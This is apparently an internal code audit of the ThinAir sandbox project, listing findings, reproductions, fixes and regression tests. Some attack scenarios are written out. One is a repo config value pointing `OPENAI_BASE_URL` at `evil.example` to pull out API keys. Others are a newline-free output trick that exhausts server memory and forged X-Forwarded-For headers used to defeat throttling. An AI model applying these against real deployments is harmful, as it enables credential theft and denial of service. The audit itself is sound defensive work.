# ThinAir code audit, 2026-11

## Context
Deep audit of the repo at `feat/pr-editor-and-ui` (HEAD 5eb4a18). All seven onboarding-v2 phases are already
shipped (progress log), so nothing below is "planned later": every finding is in code that exists today.
The audit was read-only; fixes are tracked per finding below (a check mark and the commit that fixed it).

**Evidence gathered**
- `ruff check` + `ruff format --check`: clean. `pytest -m "not docker"`: all pass, **84% line coverage** (7494 stmts).
- `pip-audit` on the lockfile: no known vulnerabilities.
- `bandit`: only `/tmp` (`HOME=/tmp` inside sandboxes), `assert`, token-name "passwords": all false positives, already `noqa`'d.
- `pyright`: 117 errors, nearly all SQLModel/SQLAlchemy column-typing noise. **One real bug** (A8). `login.py:573` is a false positive (guarded by `hasattr`).
- **`shellcheck install.sh` was NOT run** (not installed; Docker daemon was down). Installer findings are from reading only.
- Three findings (A1, A2, A3) were reproduced with throwaway scripts; those reproductions become the regression tests.
- Not read line by line: `doctor.py`, `netinfo.py`, `notify.py`, `push.py`, `github_app.py`, `profiler/*`, most of the JS views. I traced every job-scoped route in `api/routes.py` for ownership; areas below marked solid are solid only to that depth.

**Solid (one line each)**: route ownership/visibility (every job-scoped route goes through `_job_and_repo`/`_visible_repo`, non-owners get 404);
`SandboxSpec` (named volumes only, data-volume ban); egress proxy parsing (`host_allowed`, CONNECT-only, no IP literals);
secret masking before line cut; one-time `state` consumption; Web Push endpoint allow-list; CSP + no markup-from-string sinks;
profiler search (97% covered).

## Summary
1. Health is good: strong isolation defaults, careful auth, high test discipline. Bugs cluster at **boundaries nobody exercised**: process restart, hostile output, concurrency.
2. **Top 5:** (A1) a repo's test output can OOM-kill the server; (A2) after a restart, interrupted jobs never send a final event so the browser reconnects forever; (A3) a pairing code can be redeemed twice; (A4) the default trusted-proxy range lets a client forge `X-Forwarded-For` when the port is published directly; (A5) a repo's `thinair.yaml env` reaches the agent container that holds the login and API keys.
3. Release pipeline publishes `latest`/`edge` without waiting for CI and installs unlocked dependencies (A6).
4. Coverage is lowest exactly where the risk is (`sandbox/manager.py` 28%, `egress.py` 54%, `cli_adapter.py` 43%): those are only exercised by Docker tests.
5. Code-health refactors are not worth doing now; none of the large modules is causing bugs.

## Findings table
| ID | Sev | Category | Status | Where | Problem | Effort |
|----|-----|----------|--------|-------|---------|--------|
| A1 | High | Reliability/Security | CONFIRMED | `sandbox/manager.py:578-615` | `_stream_logs` buffers a line without limit: output with no `\n` grows memory and CPU quadratically | S |
| A2 | High | Correctness | CONFIRMED | `jobs/service.py:127-142` | Crash recovery writes the `interrupted` status but emits no final STATUS event; SSE ends without one | S |
| A3 | Medium | Security | CONFIRMED (forced interleaving) | `pairing.py:107-123` | `redeem` is read-then-write: two simultaneous requests both get a token from one one-time code | S |
| A4 | Medium | Security | PLAUSIBLE | `config.py:41`, `cli/main.py` `uvicorn_options` | Trusted proxies include all RFC1918 (the Docker bridge gateway), so a directly published port honours a forged `X-Forwarded-For` | M |
| A5 | Medium | Security | PLAUSIBLE | `agents/cli_adapter.py:221-222`, `project/detect.py:66` | Repo-controlled `thinair.yaml env` is placed in the agent container (next to the login volume and passthrough API keys) | M |
| A6 | Medium | Release | CONFIRMED | `release.yml`, `Dockerfile:18` | Images pushed with no CI gate; `pip install .` ignores `uv.lock`; no provenance/SBOM/signature | M |
| A7 | Medium | Upgrade path | PLAUSIBLE | `install.sh:26,469` | Compose file is fetched from `main` but the image is the latest release: version skew | M |
| A8 | Low | Correctness | CONFIRMED | `runner_client.py:178-184` | `except (RequestException, ValueError)` precedes `except RunnerSetupError` (a `ValueError`): the "runner disabled, stop" branch is dead | S |
| A9 | Low | Correctness | CONFIRMED (by reading) | `project/prepare.py:29,54` | `Foo/Bar`, `foo/bar`, `foo/bar.git` become three `Repo` rows; owner/name `..` passes the regex | S |
| A10 | Low | Correctness | PLAUSIBLE | `jobs/pr.py:437` | PR base = `parent.ref`; a tag/sha ref gives GitHub 422 *after* the branch was pushed | S |
| A11 | Low | Postgres | PLAUSIBLE | `db/session.py:31` | Naive `timestamp` columns get aware datetimes; non-UTC server timezone shifts stored values | S |
| A12 | Low | Reliability | PLAUSIBLE | `jobs/service.py:362-368,436-447` | If the final DB write fails (disk full), the job stays RUNNING and its SSE hangs until restart | S |
| A13 | Low | Performance | PLAUSIBLE | `jobs/events.py:41` | Log cap is 50,000 events x up to 8,192 chars (~400 MB/job) | S |
| A14 | Low | Security | CONFIRMED (by reading) | `api/setup_api.py:144-152` | Any member can start agent-image builds (heavy on 1 GB) | S |
| A15 | Low | Security | CONFIRMED (by reading) | `api/routes.py:425-446` | An open SSE stream keeps running after its token is revoked / user disabled | S |
| A16 | Low | CI | CONFIRMED | `ci.yml` | No shellcheck, pip-audit, ARM, concurrency; CI runs twice on PR branches; docker-only modules have no coverage signal | S |

## Finding details

### A1 High: unbounded line buffer (`_stream_logs`)
- **Problem.** `buf += chunk; *lines, buf = buf.split(b"\n")`. With no newline the whole stream stays in `buf`; the 5 MiB `max_output_bytes` is checked only in `emit`, i.e. after a line completes. `bytes +=` also copies every time (quadratic). A progress bar using only `\r`, or `yes | tr -d '\n'`, triggers it.
- **Evidence (throwaway script, 64 KiB chunks, no newline):** 8 MB: 0.3 s, peak 17 MB. 32 MB: 5.3 s, peak 67 MB. 64 MB: **21 s, peak 134 MB**, one line emitted (cap is 5 MiB). Time x4 per size x2. A container can emit GB/s; the server container is `mem_limit: 256m`, and the copying runs on a thread holding the GIL, stalling the event loop.
- **Failure scenario.** Profile or agent job on a repo whose test prints without newlines (hostile or just a buggy progress bar): the server is OOM-killed, every running job becomes `interrupted` (and see A2).
- **Fix.** In `_stream_logs` (`manager.py`): keep `buf` a `bytearray`; add `MAX_LINE_BYTES = 64 KiB`; after each chunk, while `len(buf) > MAX_LINE_BYTES` emit the first `MAX_LINE_BYTES` as one line (mark truncated) and drop the rest up to the next newline (`discarding` flag). Count `total` in raw bytes as they arrive, before splitting, so the global cap holds. Keep masking BEFORE the cut (existing gotcha): mask on the 64 KiB window plus a `max(len(secret))` carry-over so a secret across the cut is still masked. Keep draining the stream after the cap so the container never blocks on a full pipe.
- **Test.** `tests/test_sandbox_unit.py` (no Docker): fake container whose `logs()` yields 64 MiB of `b"A"*65536`; assert wall time < 2 s, `tracemalloc` peak < 8 MB, emitted lines <= cap/64 KiB + 1, truncated flag set. Second test: a secret straddling the 64 KiB cut is fully masked.

### A2 High: recovered jobs never emit a terminal STATUS event
- **Problem.** `_recover` (service.py:135) calls `_finish_row` directly. Every other path uses `_finish`, which emits the STATUS event first. The notes state the UI relies on that event (`views-jobs.js:285-306`: it closes the `EventSource` and loads the report/result only on a terminal status).
- **Evidence (throwaway script):** RUNNING job recovered at start -> `events: []`; `stream()` yields 0 frames and returns. `test_restart_recovery` only asserts the DB row.
- **Failure scenario.** Server restarts (A1's OOM, a deploy, a reboot) while a job runs. The phone opens that job: stream ends at once with no terminal event, the browser's `EventSource` auto-reconnects every ~3 s forever, "Reconnecting..." shows, and the partial result is never loaded.
- **Fix.** `_recover`: collect ids first (don't write inside the select session), then call `self._finish(j.id, FAILED, "interrupted", msg)` for RUNNING jobs. Defence in the UI (`views-jobs.js` error handler): if the stream closes and `current.job.finished` is true, `es.close()` and render once.
- **Test.** Extend `test_restart_recovery`: after start, `events.fetch(running.id)` ends with a STATUS event `failed`; and `[f async for f in events.stream(running.id)]` contains it.

### A3 Medium: pairing code redeemable twice
- **Problem.** `redeem` reads the row, checks `used_at is None`, then sets it. The route is a sync `def` (threadpool), so two requests interleave. `onetime.consume_state` already does this right (conditional UPDATE).
- **Evidence (throwaway script):** two threads forced between read and write: **2 tokens from one code**. Natural window is microseconds, so PLAUSIBLE in the wild, but the "works once" promise in SECURITY.md is only true by luck.
- **Scenario.** Someone who photographed the QR races the owner within the 10-minute window; both signed in, neither knows.
- **Fix.** `pairing.redeem`: `UPDATE pairingcode SET used_at=:now WHERE code_hash=:h AND used_at IS NULL AND expires_at > :now` and require `rowcount == 1`, then create the token (copy the pattern in `onetime.py`). Same for the short-code path (use `row.code_hash`).
- **Test.** Turn the reproduction into `tests/test_pairing.py` (barrier-patched `_find`); assert exactly one token.

### A4 Medium: `X-Forwarded-For` trusted from the whole Docker bridge
- **Problem.** `trusted_proxies` defaults to `10/8, 172.16/12, 192.168/16, fc00::/7, loopback`. If the thinair port is published directly (`THINAIR_BIND=0.0.0.0`, the no-Caddy path), Docker's userland proxy, IPv6 publishing and rootless Docker show the peer as the bridge gateway (172.x): trusted. A client's `X-Forwarded-For` then becomes its throttle key. SECURITY.md line 95 states this as safe only "where Caddy sits".
- **Scenario.** Attacker sends a fresh `X-Forwarded-For` per request: the 10-failures/min throttle never fires. Against 20-31 character hand-picked `THINAIR_ADMIN_TOKEN`s, and the 8-character pairing code, that removes the online-guessing brake (the 20-failure burn of short codes remains).
- **Fix.** Default `trusted_proxies` to loopback only; have the installer's domain mode and the `https` compose profile set `THINAIR_TRUSTED_PROXIES=172.16.0.0/12` (the compose network) in `.env`. Add a global backstop in `api/auth.py`: more than 200 failures/min across all keys -> only strong tokens are checked (same rule as today's throttled state). Doctor: warn when `THINAIR_BIND` is not loopback and no domain is set.
- **Test.** Live-server test (the existing one that caught the IPv4 crash): request from 127.0.0.1 with a forged header under default settings must not change the key; with trusted set, it must. Unit test for the global backstop.

### A5 Medium: repo `thinair.yaml env` reaches the agent container
- **Problem.** `CLIAdapter._env` = `{**resolved.env, **cfg.env, **passthrough}`; `resolved.env` includes the repo's `config.env` (detect.py:66). The agent container mounts the login volume and receives passthrough API keys. SECURITY.md documents that an agent *can be tricked* into leaking logins; this is deterministic: no agent cooperation is needed.
- **Scenario (PLAUSIBLE; depends on each CLI honouring the variable).** Repo ships `env: {OPENAI_BASE_URL: https://evil.example}` (or a `*_BASE_URL`, `NODE_OPTIONS`, `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`). Codex/Gemini runs have open egress, so the key or login token goes to the attacker. The built-in Anthropic agent is protected by its allowlist today, but only while `THINAIR_AGENT_EGRESS=allowlist`.
- **Fix.** In `CLIAdapter._env` drop repo env entirely for agent runs except keys the agent config lists (`AgentConfig.env_from_repo: [...]`, default empty). The repo env still applies to install/test steps. Keep PATH/VIRTUAL_ENV (they come from `_PY_ENV`, not the repo). Document in docs/agents.md and the `thinair.yaml` reference.
- **Test.** `test_agents_unit.py`: a `ResolvedProject` with `env={"OPENAI_BASE_URL": "x"}` produces an agent env without it; PATH is kept.

### A6 Medium: release pipeline
- **Problem.** `release.yml` runs on every push to `main` and every tag independently of `ci.yml`: a red commit still publishes `edge`, a red tag publishes `latest`. `Dockerfile` runs `pip install .` so dependency versions are whatever is newest at build time (the committed `uv.lock` is not used). Base images are tags, not digests. No SBOM/provenance attestation or signature, so users can't verify what `install.sh` pulls.
- **Fix.** (1) Add a `test` job (ruff + `pytest -m "not docker"`) and `needs: test` to the image job (or `workflow_call` CI). (2) Export constraints in the build: `uv export --no-hashes --no-dev > constraints.txt` committed/generated in the workflow; Dockerfile `pip install -c constraints.txt ".${EXTRAS...}"`. (3) `provenance: mode=max`, `sbom: true` on build-push; keyless `cosign sign` of the digest (needs `id-token: write`). (4) Pin base image digests via Dependabot/Renovate.
- **Test.** Workflow-level: a deliberately failing test on a throwaway branch must block the image job; `docker buildx imagetools inspect` shows attestations.

### A7 Medium: installer fetches compose from `main`
- **Problem.** `RAW_URL=.../main` and `fetch $RAW_URL/docker-compose.yml`, while the image tag defaults to `latest` (last release). A commit on main that changes compose (e.g. the `NETWORKS: 1` the egress allowlist needs) reaches installs before an image that supports it exists.
- **Fix.** Publish `docker-compose.yml` and `install.sh` as release assets (in `release.yml`), and have the installer fetch the compose file for the resolved version (`.../releases/download/vX.Y.Z/docker-compose.yml`; for `latest`, `.../releases/latest/download/...`; `edge` and `local` keep using main). `THINAIR_RAW_URL` stays for offline tests.
- **Test.** The existing `docker:cli` installer test with a fake release layout; assert the fetched compose matches the tag.

### A8 Low: disabled runner never stops
- **Problem.** `RunnerSetupError(ValueError)` (runner_client.py:37) is swallowed by the earlier `except (requests.RequestException, ValueError)`; pyright flags it as unreachable. Comment says "disabled while working: stop".
- **Scenario.** Admin disables a runner mid-job: it keeps profiling to the end, posting 401s every tick (each counts toward the failed-token throttle for that address).
- **Fix.** Put `except RunnerSetupError` first (re-raise path), then the generic one. **Test.** Extend the live-uvicorn runner test: disable the runner while the fake profiler sleeps; assert the client exits and the work task is cancelled.

### A9 Low: repo identity
- GitHub names are case-insensitive and `.git` is optional, but `GitSource.url` is only stripped of `/`. `https://github.com/Foo/Bar`, `.../foo/bar`, `.../foo/bar.git` become separate `Repo` rows (split history, defaults, member visibility). The regex also accepts `..` as owner/name.
- **Fix.** Canonicalise in `GitSource` (strip `.git`, lowercase owner and name; reject `.`/`..`), look up existing rows with `func.lower(Repo.url)` so old rows still match (no data migration). **Test.** `test_api.py`: three spellings -> one repo id.

### A10 Low: PR base can be a tag or sha
`base = parent.ref or default_branch` (pr.py:437), and `GIT_REF` allows tags. GitHub returns 422 after the branch is already pushed (stray `thinair/<id>` branch, generic error). **Fix:** `GitHubClient.is_branch(owner, name, ref)` (`GET /branches/{ref}`), else fall back to the default branch and log it. **Test:** `test_pr.py` with the fake HTTP layer.

### A11 Low: Postgres timezone
Columns are naive `timestamp`; code writes aware UTC datetimes. psycopg converts aware values using the session `TimeZone`, so on a non-UTC server `finished_at`, token `last_used_at` and pairing `expires_at` shift (retention cutoff, expiry checks). **Fix:** `make_engine` for Postgres: `connect_args={"options": "-c timezone=UTC"}`. **Test:** `test_postgres_docker.py`: `SHOW timezone` is `UTC`; round-trip an aware datetime on a server started with `TZ=Asia/Kathmandu`.

### A12 Low: failed final write leaves a job RUNNING
`_execute`'s `finally` and `_finish` do DB writes with no fallback; a full disk or locked DB raises inside the worker, the row stays RUNNING, the SSE never ends. **Fix:** wrap `_finish` in a retry (3 tries, 1 s) and, on final failure, log loudly and keep the job id in `self._unsettled`, retried at the next `start()` (already handled by `_recover`). **Test:** executor that returns after monkeypatching `session_scope` to raise once.

### A13 Low: event cap by count
Cap per job is 50,000 events; each line may be 8,192 chars (about 400 MB in SQLite/PG in the worst case, and a profile job runs up to 40 sandboxes). **Fix:** also count bytes in `EventStore.emit` (default 20 MB per job, `THINAIR_MAX_LOG_BYTES`). **Test:** `test_events.py`.

### A14 Low: members can start image builds
`POST /api/setup` with `preferred_agent` calls `_start_prebuild` for any caller; on a 1 GB VM a build is heavy. **Fix:** only start the prebuild for admins (members' choice is still saved; their first job builds it, under the job limit). **Test:** `test_setup_api.py`.

### A15 Low: SSE outlives revocation
Auth is checked at connect only. **Fix:** in `EventStore.stream` callers, re-verify the token on each keep-alive (every 15 s: one indexed lookup); end the stream if revoked. **Test:** revoke during an open stream; stream ends within one heartbeat (use a short heartbeat).

### A16 Low: CI gaps
`ci.yml` runs on `push` and `pull_request` (double runs), has no shellcheck (the project conventions require install.sh to stay shellcheck-clean), no `pip-audit`, no ARM job (the product targets ARM VMs; release builds arm64 only under QEMU and never tests it), and no coverage signal for modules only the Docker job touches. **Fix:** `concurrency` group; `shellcheck install.sh` step; `uvx pip-audit`; a `ubuntu-24.04-arm` docker-tests job; `--cov` in the docker job with a floor on `sandbox/` and `agents/cli_adapter.py`. Align `checkout`/`setup-uv` versions with release.yml.

## Proposals (not for now)
- **P1: a filtering Docker proxy.** docker-socket-proxy filters by endpoint, not by body: with `CONTAINERS=1` + `POST=1`, a compromised Thinair process can create a privileged container with a host bind mount (SECURITY.md already says so in one line). A small Thinair-specific proxy (or a regex-allowlist socket proxy) that rejects `Privileged`, `Binds`, `HostConfig.NetworkMode=host`, added caps and non-`thinair.` labels would close it. Trade-off: one more component on a 100 MB idle budget; new code on the most security-critical path; wording in SECURITY.md should be sharpened either way.
- **P2: stop trusting forwarded headers by network range.** Have Caddy reach Thinair over a unix socket or a fixed address and trust only that. Removes A4's class. Trade-off: compose and installer rework.
- **P3: logs outside the database.** Append-only rotated files per job, DB keeps only status events. Cuts DB growth (A13) and the sync-commit-in-the-loop cost. Trade-off: SSE replay and retention rewritten; Postgres-without-a-volume deployments need a volume.
- **Not proposing:** splitting `routes.py`/`views-*.js`; they are large but not where bugs came from.

## Fix batches
Order = severity x 1/effort.

**Batch 1: `fix/audit-batch-1` (A1, A2 [+ A3 and A8 if you say yes, see Questions])**
Files: `sandbox/manager.py`, `jobs/service.py`, `web/static/views-jobs.js`, `tests/test_sandbox_unit.py` (new), `tests/test_jobs.py`, `docs/audits/2026-11-code-audit.md`.
1. Create the branch from `main`. Commit 1: the audit doc (`docs: code audit 2026-11`).
2. A1: write the two failing tests; run and watch them fail; implement the bounded `bytearray` buffer; green; `ruff`.
3. A2: extend `test_restart_recovery` (fails: no final STATUS); change `_recover` to `_finish`; add the UI guard; green.
4. Run `uv run ruff check . && uv run ruff format --check . && uv run pytest -m "not docker"` and `uv run pytest -m docker` (Docker Desktop was not running in this session: I'll start it or report Docker tests as not run).
5. One conventional commit per finding (`fix(sandbox): ...`, `fix(jobs): ...`), then update the audit doc with a checkmark and the commit hash (separate `docs:` commit), add the "Verify manually" list, push, open the PR with the full `gh` path.
Verify manually: restart the server mid-job and open the job on a phone (no reconnect loop); run a repo whose test prints 100 MB without newlines and watch server memory with `docker stats`.

**Batch 2: `fix/audit-batch-2` (A3, A8, A9, A10, A11, A12)** all S; the tests are listed in each finding.
**Batch 3: `fix/audit-batch-3` (A4, A5)** security hardening, M. A4 changes defaults: needs a CHANGELOG note and a doctor check.
**Batch 4: `fix/audit-batch-4` (A6, A7, A16, A13, A14, A15)** pipeline and installer; A6/A7 can't be fully tested without a real release tag, so they need a dry-run on a fork.
